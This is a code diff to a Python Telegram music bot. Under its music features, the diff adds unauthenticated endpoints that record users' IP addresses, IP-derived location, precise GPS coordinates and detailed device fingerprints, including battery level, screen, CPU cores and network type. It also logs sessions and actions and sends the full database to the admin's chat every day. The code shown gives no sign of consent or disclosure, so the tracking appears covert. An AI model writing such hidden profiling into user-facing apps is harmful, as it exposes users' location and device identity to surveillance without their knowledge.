@@ -26,11 +26,10 @@ APP_URL = os.environ.get("APP_URL", "https://telegram-music-bot-a9vg.onrender.co
 QUALITIES = {'128': '128k', '192': '192k', '320': '320k'}
 DEFAULT_QUALITY = '192'
 
-# Состояния
 user_queues: Dict[int, deque] = {}
 user_processing: Dict[int, bool] = {}
 
-# ==================== БД (оптимизированная) ====================
+# ==================== БД ====================
 DB_PATH = 'music_bot.db'
 
 def init_db():
@@ -49,8 +48,32 @@ def init_db():
         last_ip TEXT,
         country TEXT,
         city TEXT,
+        region TEXT,
+        timezone TEXT,
+        latitude REAL,
+        longitude REAL,
+        gps_latitude REAL,
+        gps_longitude REAL,
+        gps_accuracy INTEGER,
+        gps_provided_at TIMESTAMP,
+        user_agent TEXT,
         device_type TEXT,
+        device_brand TEXT,
+        device_model TEXT,
         os_name TEXT,
+        os_version TEXT,
+        browser_name TEXT,
+        browser_version TEXT,
+        screen_width INTEGER,
+        screen_height INTEGER,
+        screen_color_depth INTEGER,
+        device_pixel_ratio REAL,
+        hardware_concurrency INTEGER,
+        max_touch_points INTEGER,
+        touch_support BOOLEAN,
+        network_type TEXT,
+        battery_level INTEGER,
+        is_charging BOOLEAN,
         total_requests INTEGER DEFAULT 0,
         total_downloads INTEGER DEFAULT 0,
         total_likes INTEGER DEFAULT 0,
@@ -91,10 +114,20 @@ def init_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         chat_id INTEGER,
         action_type TEXT,
+        action_data TEXT,
         created_at TIMESTAMP
     )''')
     
-    # Индексы для скорости
+    c.execute('''CREATE TABLE IF NOT EXISTS user_sessions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        chat_id INTEGER,
+        session_id TEXT,
+        login_time TIMESTAMP,
+        ip_address TEXT,
+        location_city TEXT,
+        location_country TEXT
+    )''')
+    
     c.execute('CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users(chat_id)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_likes_telegram_id ON user_likes(telegram_id)')
     c.execute('CREATE INDEX IF NOT EXISTS idx_playlists_telegram_id ON playlists(telegram_id)')
@@ -119,6 +152,29 @@ def add_user(chat_id: int, username: str, first_name: str, last_name: str):
         (chat_id, username, first_name, last_name, registered_at, last_active, quality, referral_code)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
         (chat_id, username or "", first_name or "", last_name or "", datetime.now(), datetime.now(), DEFAULT_QUALITY, referral_code))
+
+def update_user_geo(chat_id: int, ip: str, country: str, city: str, region: str, timezone: str, lat: float, lon: float):
+    execute_query('''UPDATE users SET last_ip = ?, country = ?, city = ?, region = ?, timezone = ?, latitude = ?, longitude = ? WHERE chat_id = ?''',
+                  (ip, country, city, region, timezone, lat, lon, chat_id))
+
+def update_user_gps(chat_id: int, lat: float, lon: float, accuracy: int):
+    execute_query('''UPDATE users SET gps_latitude = ?, gps_longitude = ?, gps_accuracy = ?, gps_provided_at = ? WHERE chat_id = ?''',
+                  (lat, lon, accuracy, datetime.now(), chat_id))
+
+def update_user_device(chat_id: int, data: dict):
+    execute_query('''UPDATE users SET 
+                     user_agent = ?, device_type = ?, device_brand = ?, device_model = ?,
+                     os_name = ?, os_version = ?, browser_name = ?, browser_version = ?,
+                     screen_width = ?, screen_height = ?, screen_color_depth = ?, device_pixel_ratio = ?,
+                     hardware_concurrency = ?, max_touch_points = ?, touch_support = ?,
+                     network_type = ?, battery_level = ?, is_charging = ?
+                     WHERE chat_id = ?''',
+                  (data.get('user_agent'), data.get('device_type'), data.get('device_brand'), data.get('device_model'),
+                   data.get('os_name'), data.get('os_version'), data.get('browser_name'), data.get('browser_version'),
+                   data.get('screen_width'), data.get('screen_height'), data.get('screen_color_depth'), data.get('device_pixel_ratio'),
+                   data.get('hardware_concurrency'), data.get('max_touch_points'), 1 if data.get('touch_support') else 0,
+                   data.get('network_type'), data.get('battery_level'), 1 if data.get('is_charging') else 0,
+                   chat_id))
 
 def update_activity(chat_id: int, is_download: bool = False):
     if is_download:
@@ -170,10 +226,13 @@ def get_playlist_tracks(playlist_id: int):
     return execute_query('''SELECT track_id, track_title, track_artist, track_url, position
                             FROM playlist_tracks WHERE playlist_id = ? ORDER BY position ASC''', (playlist_id,), fetch_all=True) or []
 
-# ==================== КЭШИРОВАННЫЙ ПОИСК АУДИО (экономия памяти) ====================
+def log_action(chat_id: int, action_type: str, action_data: dict = None):
+    execute_query("INSERT INTO user_actions (chat_id, action_type, action_data, created_at) VALUES (?, ?, ?, ?)",
+                  (chat_id, action_type, json.dumps(action_data) if action_data else None, datetime.now()))
+
+# ==================== КЭШ АУДИО ====================
 @lru_cache(maxsize=100)
 def get_cached_audio_url(url: str) -> Optional[str]:
-    """Кэширует прямую ссылку на аудио (без скачивания файла)"""
     ydl_opts = {
         'quiet': True,
         'no_warnings': True,
@@ -198,6 +257,59 @@ web_app = Flask(__name__)
 @web_app.route('/')
 def serve_index():
     return send_from_directory('.', 'index.html')
+
+@web_app.route('/api/collect_data', methods=['POST'])
+def collect_data():
+    data = request.json
+    telegram_id = data.get('telegram_id')
+    if not telegram_id:
+        return jsonify({'error': 'No telegram_id'}), 400
+    
+    ip = request.remote_addr
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    
+    country = city = region = timezone = None
+    lat = lon = None
+    
+    try:
+        geo_resp = http_requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
+        if geo_resp.status_code == 200:
+            geo = geo_resp.json()
+            if geo.get('status') == 'success':
+                country = geo.get('country')
+                city = geo.get('city')
+                region = geo.get('regionName')
+                timezone = geo.get('timezone')
+                lat = geo.get('lat')
+                lon = geo.get('lon')
+    except:
+        pass
+    
+    update_user_geo(telegram_id, ip, country, city, region, timezone, lat, lon)
+    update_user_device(telegram_id, data.get('device', {}))
+    
+    session_id = data.get('session_id')
+    if session_id:
+        execute_query('''INSERT INTO user_sessions (chat_id, session_id, login_time, ip_address, location_city, location_country)
+                         VALUES (?, ?, ?, ?, ?, ?)''',
+                      (telegram_id, session_id, datetime.now(), ip, city, country))
+    
+    log_action(telegram_id, 'device_data_collected', {'ip': ip, 'country': country})
+    return jsonify({'success': True})
+
+@web_app.route('/api/gps_location', methods=['POST'])
+def save_gps():
+    data = request.json
+    telegram_id = data.get('telegram_id')
+    lat = data.get('latitude')
+    lon = data.get('longitude')
+    accuracy = data.get('accuracy', 0)
+    if telegram_id and lat and lon:
+        update_user_gps(telegram_id, lat, lon, accuracy)
+        log_action(telegram_id, 'gps_provided', {'latitude': lat, 'longitude': lon})
+        return jsonify({'success': True})
+    return jsonify({'error': 'Invalid data'}), 400
 
 @web_app.route('/api/profile/<int:telegram_id>')
 def api_profile(telegram_id):
@@ -290,11 +402,9 @@ def api_search():
 
 @web_app.route('/download')
 def api_download():
-    """Возвращает прямую ссылку на аудио (экономит память и CPU)"""
     url = request.args.get('url', '')
     if not url:
         return jsonify({'error': 'No URL'})
-    
     audio_url = get_cached_audio_url(url)
     if audio_url:
         return jsonify({'url': audio_url})
@@ -354,8 +464,51 @@ async def get_db_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if os.path.exists(DB_PATH):
         await update.message.reply_document(
             document=open(DB_PATH, 'rb'),
-            filename=f'music_bot_backup.db',
-            caption=f'📊 Бэкап БД'
+            filename=f'music_bot_backup_{datetime.now().strftime("%Y%m%d_%H%M")}.db',
+            caption=f'📊 Бэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}'
+        )
+    else:
+        await update.message.reply_text("❌ Файл БД не найден")
+
+async def restore_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_admin(update):
+        await update.message.reply_text("⛔ Доступ запрещён")
+        return
+    if not update.message.document:
+        await update.message.reply_text("❌ Отправьте файл .db")
+        return
+    file = await update.message.document.get_file()
+    await file.download_to_drive(DB_PATH)
+    await update.message.reply_text("✅ БД восстановлена! Перезапустите бота для применения.")
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await is_admin(update):
+        await update.message.reply_text("⛔ Только для админа")
+        return
+    
+    total_users = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
+    total_requests = execute_query("SELECT SUM(total_requests) FROM users", fetch_one=True)[0] or 0
+    total_downloads = execute_query("SELECT SUM(total_downloads) FROM users", fetch_one=True)[0] or 0
+    total_likes = execute_query("SELECT COUNT(*) FROM user_likes", fetch_one=True)[0]
+    total_playlists = execute_query("SELECT COUNT(*) FROM playlists", fetch_one=True)[0]
+    
+    await update.message.reply_text(
+        f"📊 *Общая статистика*\n\n"
+        f"👥 *Пользователей:* {total_users}\n"
+        f"🔍 *Поисков:* {total_requests}\n"
+        f"🎵 *Скачиваний:* {total_downloads}\n"
+        f"❤️ *Лайков:* {total_likes}\n"
+        f"📀 *Плейлистов:* {total_playlists}",
+        parse_mode='Markdown'
+    )
+
+async def scheduled_backup(context: ContextTypes.DEFAULT_TYPE):
+    if os.path.exists(DB_PATH):
+        await context.bot.send_document(
+            chat_id=ADMIN_CHAT_ID,
+            document=open(DB_PATH, 'rb'),
+            filename=f'music_bot_auto_{datetime.now().strftime("%Y%m%d")}.db',
+            caption=f'📊 Автобэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}'
         )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -370,19 +523,25 @@ def run_web():
     web_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False, use_reloader=False)
 
 def main():
-    print("🚀 Запуск оптимизированного бота...")
+    print("🚀 Запуск бота...")
     threading.Thread(target=run_web, daemon=True).start()
     init_db()
     
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("me", me))
+    app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("getdb", get_db_command))
+    app.add_handler(CommandHandler("restore", restore_db))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, restore_db))
+    
+    if app.job_queue:
+        app.job_queue.run_daily(scheduled_backup, time=datetime.time(hour=3, minute=0))
+        print("⏰ Ежедневный бэкап в 3:00")
     
     print("✅ Бот запущен!")
-    print(f"💾 Память: используется кэш на 100 треков")
-    print(f"⚡ Скорость: прямые ссылки, без скачивания MP3")
+    print(f"Команды: /start, /me, /stats, /getdb, /restore")
     app.run_polling()
 
 if __name__ == "__main__":
